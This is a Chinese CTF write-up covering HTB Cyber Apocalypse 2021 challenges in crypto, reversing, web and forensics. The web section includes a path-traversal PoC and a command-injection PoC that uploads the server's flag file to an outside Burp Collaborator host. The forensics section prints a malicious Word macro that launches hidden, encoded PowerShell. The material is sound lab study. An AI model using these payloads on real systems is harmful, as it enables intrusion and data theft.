---
layout: post
title: "Cyber Apocalypse 2021 Writeups"
date: 2021-04-25
author: 2hanx
toc: true
categories: [Writeups]
tags: [ctf]
---

## Crypto

### Nintendo Base64

#### 题目

Aliens are trying to cause great misery for the human race by using our own cryptographic technology to encrypt all our games. Fortunately, the aliens haven't played CryptoHack so they're making several noob mistakes. Therefore they've given us a chance to recover our games and find their flags. They've tried to scramble data on an N64 but don't seem to understand that encoding and ASCII art are not valid types of encryption!

#### 解法

题目中包含**Base64**，猜测是base64解密，并且解压文件得到一个*output.txt*文本文件。接下来也比较简单，去掉空格后通过CyberChef重复base64解密即可得到flag：`CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}`

### PhaseStream 1

#### 题目

The aliens are trying to build a secure cipher to encrypt all our games called "PhaseStream". They've heard that stream ciphers are pretty good. The aliens have learned of the XOR operation which is used to encrypt a plaintext with a key. They believe that XOR using a repeated 5-byte key is enough to build a strong stream cipher. Such silly aliens! Here's a flag they encrypted this way earlier. Can you decrypt it (hint: what's the flag format?) `2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904`

#### 解法

题目给的提示简单明了：异或算法，并给出key长度是5字节，并给出提示注意flag的格式，这里flag的格式是`CHTB{}`。那么只要将`CHTB{`与密文前五个字节`[0x2e,0x31,0x3f,0x27,0x02]`异或运算就可得到key：`mykey`，解密脚本如下：


```python
c = [0x2e, 0x31, 0x3f, 0x27, 0x02, 0x18, 0x4c, 0x5a, 0x0b, 0x1e, 0x32, 0x12, 0x05, 0x55, 0x0e, 0x03, 0x26, 0x1b, 0x09, 0x4d, 0x5c, 0x17, 0x1f, 0x56, 0x01, 0x19, 0x04]

key = "mykey"

flag = ""

for i in range(0, len(c)):
    flag += chr(c[i] ^ ord(key[i % 5]))
print(flag)
# CHTB{u51ng_kn0wn_pl41nt3xt}
```
### PhaseStream 2

#### 题目

The aliens have learned of a new concept called "security by obscurity". Fortunately for us they think it is a great idea and not a description of a common mistake. We've intercepted some alien comms and think they are XORing flags with a single-byte key and hiding the result inside 9999 lines of random data, Can you find the flag?

#### 解法

题目给的信息很明显，也是XOR加密，并且key的长度是1字节，那么暴力破解进行运算即可。经过运算，异或字节`0x45`即可找到flag：`CHTB{n33dl3_1n_4_h4yst4ck}`。此外更便捷的方法是使用xortool工具暴力破解，执行命令：`xortool -x -b -l 1 output.txt`，然后在结果中找到flag：`grep -ao "CHTB" ./*`

### PhaseStream 3

#### 题目

The aliens have learned the stupidity of their misunderstanding of Kerckhoffs's principle. Now they're going to use a well-known stream cipher (AES in CTR mode) with a strong key. And they'll happily give us poor humans the source because they're so confident it's secure!

#### 解法

题目给出了2个密文和用于生成它们的脚本源代码。通过阅读源码可以知道该题涉及到CTR模式的AES攻击，它本身并不容易受到攻击，但仔细观察可以发现在每次加密时都重复使用相同的密钥key并重置计数，从而将其减少了多次使用时间的问题。此外，源码中给出一个明文和加密后的密文，因此可以通过[mtp](https://github.com/CameronLonsdale/MTP)轻松解决

![1]({{ '/ca2021/crypto_ps3.png' | prepend: site.url }})

## Reverse

### Passphrase

使用IDA 打开linux程序，定位到主函数并分析程序流程，结果比较简单，程序将输入的*secret passphrase*传递给`s[40]`数组，并与一系列字符进行比较，解密脚本如下：

```python
c = "51 120 116 114 52 116 51 114 82 51 115 116 82 49 52 76 53 95 86 83 95 104 117 109 52 110 53"
c = c.split(" ")
flag = ""
for i in c:
    flag += chr(int(i))

print("CHTB{"+flag+"}")
# CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}
```

### Authenticator

使用IDA定位到主函数，并分析源码

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char s; // [rsp+0h] [rbp-50h]
  char v5; // [rsp+20h] [rbp-30h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  printstr(&unk_BC3, 0LL);
  printstr("Please enter your credentials to continue.\n\n", 0LL);
  printstr("Alien ID: ", 0LL);
  fgets(&s, 32, stdin);
  if ( !strcmp(&s, "11337\n") )
  {
    printstr("Pin: ", 0LL);
    fgets(&v5, 32, stdin);
    if ( (unsigned int)checkpin(&v5, 32LL) )
      printstr("Access Denied!\n", 1LL);
    else
      printstr("Access Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}\n", 0LL);
    result = 0;
  }
  else
  {
    printstr("Access Denied!\n", 1LL);
    result = 0;
  }
  return result;
}
```

输入的*ID*需要等于*11337*才能进行下一步，并且将输入的*Pin*传入`v5[32]`,并将该数组传入到*checkpin()*函数，返回结果为0，则会输出flag。

```cpp
signed __int64 __fastcall checkpin(const char *a1)
{
  int i; // [rsp+14h] [rbp-1Ch]

  for ( i = 0; i < strlen(a1) - 1; ++i )
  {
    if ( ((unsigned __int8)aAVhAG8j89gvPDv[i] ^ 9) != a1[i] )
      return 1LL;
  }
  return 0LL;
}
```

分析*checkpin()*函数可知，当输入的数组与某常量数组异或9之后相同即可返回0。至此可写出解密脚本如下：

```python
flag = ""
c = "}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"
for i in range(len(c)):
    flag += chr(ord(c[i]) ^ 9)

print("CHTB{"+flag+"}")
# CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}
```

## Web

### Inspector Gadget

送分题，通过Chrome Devtools就可以找到flag：`CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`

### MiniSTRyplace

代码审计后在*index.php*文件中找到漏洞点，分析可知代码中存在LFI漏洞，其中的`str_replace()`函数将参数值里的`../`替换成空，因此只要绕过即可。

```php
<?php
$lang = ['en.php', 'qw.php'];
    include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
?>
```

PoC：`http://139.59.168.47:31097/?lang=....//....//flag`

### Caas

*index.php*文件中使用`Router()`类对象声明两个*router*规则：

1. 请求主页面*/*，响应*views/index.php*页面

2. 请求*/api/curl*，调用*execute()*方法

   ```php
   public function execute($router)
   {
       $url = $_POST['ip'];
   
       if (isset($url)) {
           $command = new CommandModel($url);
           return json_encode([ 'message' => $command->exec() ]);
       }
   }
   ```

   该方法中新增请求参数*ip*，并声明一个新的*CommandModel*类对象*command*。继续分析*CommandModel*类

   ```php
   <?php
   class CommandModel
   {
       public function __construct($url)
       {
           $this->command = "curl -sL " . escapeshellcmd($url);
       }
   
       public function exec()
       {
           exec($this->command, $output);
           return $output;
       }
   }
   ```

   将参数*ip*值传给`escapeshellcmd()`，并执行命令：`curl -sL xxx`

通过简要分析，我们可以自定义*ip*的值，那么将会在服务器上执行`curl`命令，因此存在命令注入漏洞。

PoC： `curl -X POST "http://138.68.132.86:30750/api/curl"  -d 'ip=http://o9yr9lg0jeo8emks05stgsig87ex2m.burpcollaborator.net -F "file=@../../flag"'`

## Forensics

### Key mission

考察usb键盘取证，通过*tshark*取数据：` tshark -r key_mission.pcap -T fields -e usb.capdata 'usb.data_len == 8' > usbdata`，然后删除一些无效数据，使用脚本读键盘数据

```python
#!/usr/bin/env python

DataFileName = "./usbdata"

presses = []

normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}


with open(DataFileName, "r") as f:
    for line in f:
        presses.append(line[0:-1])
# handle
result = ""
for press in presses:
    Bytes = press.split(":")
    if Bytes[0] == "00":
        if Bytes[2] != "00":
            result += normalKeys[Bytes[2]]
    elif Bytes[0] == "02": # shift key is pressed.
        if Bytes[2] != "00":
            result += shiftKeys[Bytes[2]]
    else:
        print "[-] Unknow Key : %s" % (Bytes[0])
print "[+] Found : %s" % (result)
# I am sending secretarys location over this totally encrypted channel to make sure no one else will be able to read it except of us This information is confidential and must not be shared with anyone else The secretarys hidden location is CHTB{a_plac3_fAr_fAr_away_fr0m_earth}
```

### Invitation

Microsoft Word打开*docm*文档，进入到宏编辑选项，找到宏代码，关键部分显示如下：

```vbscript
Sub Auto_Open()
Dim bomazpcuwhstlcd As String
Dim dbcsmjrdsqm As String
Dim gxiwcxqzqi As String
Dim uejdkidq As String
bomazpcuwhstlcd = odsuozldxufm("4c674167414367414941416b414641416377426f4147384162514246414673414e414264414373414a41427741484d4161414276414530415a51426241444d414d414264414373414a774234414363414b514167414367414941426241484d416441427941476b4162674248414630414f67413641476f41627742704147") & odsuozldxufm("34414b41416e") & _
[.....省略显示.....]
x = Shell(odsuozldxufm("50") & odsuozldxufm("4f5745525348454c4c2e6578") & odsuozldxufm("65202d6e6f65786974202d772068696464") & odsuozldxufm("656e202d656e6320") & bomazpcuwhstlcd & dbcsmjrdsqm & gxiwcxqzqi & uejdkidq, 1)
End Function


Private Function odsuozldxufm(ByVal gwndcowqyulk As String) As String
Dim cjzkqjwvtdxr As Long
For cjzkqjwvtdxr = 1 To Len(gwndcowqyulk) Step 2
odsuozldxufm = odsuozldxufm & Chr$(Val("&H" & Mid$(gwndcowqyulk, cjzkqjwvtdxr, 2)))
Next cjzkqjwvtdxr
End Function
```

经过整理，如下所示：

```vbscript
Sub Auto_Open()
Dim a As String
Dim c As String
Dim d As String
Dim e As String
a = b("4c674167414367414941416b414641416377426f41[...省略显示...]")
c = b("5151424e4147634151514172414545415177425a41[...省略显示...]")
d = b("56414235414841415a514167414330415467426841[...省略显示...]")
e = b("6441426441446f414f67425641484d415a51427941[...省略显示...]")
x = Shell(b("504f5745525348454c4c2e657865202d6e6f[...省略显示...]") & a & c & d & e, 1)
End Function


Private Function b(ByVal g As String) As String
Dim f As Long
For f = 1 To Len(g) Step 2
b = b & Chr$(Val("&H" & Mid$(g, f, 2)))
Next f
End Function
```

```shell
POWERSHELL.exe -noexit -w hidden -enc LgAgACgAIAAkAFAAcwBoAG8AbQBFAFsANABdACsAJABwAHMAaABvAE0AZQBbADMAMABdACsA[...省略显示...]
```

`CHTB{maldocs_are_the_new_meta}`

